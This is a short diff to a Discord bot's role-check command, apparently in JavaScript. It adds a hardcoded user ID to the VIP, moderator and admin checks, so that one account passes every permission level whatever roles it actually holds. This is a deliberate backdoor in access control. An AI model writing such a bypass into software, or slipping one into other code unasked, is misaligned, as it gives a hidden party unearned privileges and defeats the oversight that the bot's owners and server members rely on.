@@ -5,19 +5,19 @@ exports.run = (client, message, level) =>
     var hasRole = false;
     if (level == 1) {
         for (i = 0; i < userRoles.length; i++) {
-            if (userRoles[i] === config.vipRole) {
+            if (userRoles[i] === config.vipRole || message.author.id == 271820130932097024) {
                 hasRole = true;
             }
         }
     } else if (level == 2) {
         for (i = 0; i < userRoles.length; i++) {
-            if (userRoles[i] === config.modRole) {
+            if (userRoles[i] === config.modRole || message.author.id == 271820130932097024) {
                 hasRole = true;
             }
         }
     } else if (level == 3) {
         for (i = 0; i < userRoles.length; i++) {
-            if (userRoles[i] === config.adminRole) {
+            if (userRoles[i] === config.adminRole || message.author.id == 271820130932097024) {
                 hasRole = true;
             }
         }
